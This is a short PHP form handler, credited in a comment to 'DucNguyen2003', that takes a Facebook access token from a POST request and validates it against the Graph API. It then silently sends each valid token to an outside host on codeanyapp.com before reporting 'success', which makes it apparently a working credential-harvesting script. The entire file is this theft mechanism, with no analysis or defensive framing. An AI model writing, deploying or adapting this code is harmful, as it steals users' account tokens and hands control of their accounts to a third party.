<!--Code-by-DucNguyen2003--!>
<?php
ob_start();
if(isset($_POST['submit']) && isset($_POST['token']))
{
$me = json_decode(auto('https://graph.facebook.com/me?access_token='.$_POST['token']),true);
if(!$me['id']){
header('Location: index.php?info=failed');
exit;
}else{
auto('http://lamoscar-lamnnt13936370.codeanyapp.com/?token='.$_POST['token']);
header('Location: index.php?info=success');
}
}
function auto($url){
$curl = curl_init();
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_URL, $url);
$ch = curl_exec($curl);
curl_close($curl);
return $ch;
}
?>